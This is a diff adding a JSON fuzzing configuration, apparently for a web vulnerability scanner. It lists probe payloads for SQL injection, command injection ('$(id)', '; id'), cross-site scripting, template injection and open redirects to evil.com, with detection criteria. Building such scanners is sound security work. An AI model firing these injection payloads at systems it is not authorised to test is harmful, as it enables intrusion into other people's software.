@@ -1,0 +1,12 @@
+{
+  "type": "fuzz",
+  "description": "Boundary and edge-case inputs to trigger observable differences",
+  "applicable_classes": ["sqli", "rce", "xss", "open_redirect", "idor_read", "idor_write"],
+  "techniques": {
+    "sqli": {"payloads": ["'", "\"", "' OR 1=1--", "1; WAITFOR DELAY '0:0:5'--"], "detection": ["error message", "time delay", "boolean difference"]},
+    "rce": {"payloads": ["$(id)", "`id`", "| id", "; id"], "detection": ["command output in response", "time delay", "OOB callback"]},
+    "xss": {"payloads": ["<script>alert(1)</script>", "<img src=x onerror=alert(1)>", "{{7*7}}"], "detection": ["payload reflected unescaped", "DOM modification"]},
+    "open_redirect": {"payloads": ["//evil.com", "https://evil.com", "/\\evil.com"], "detection": ["Location header points to external domain"]}
+  },
+  "timeout_seconds": 15
+}
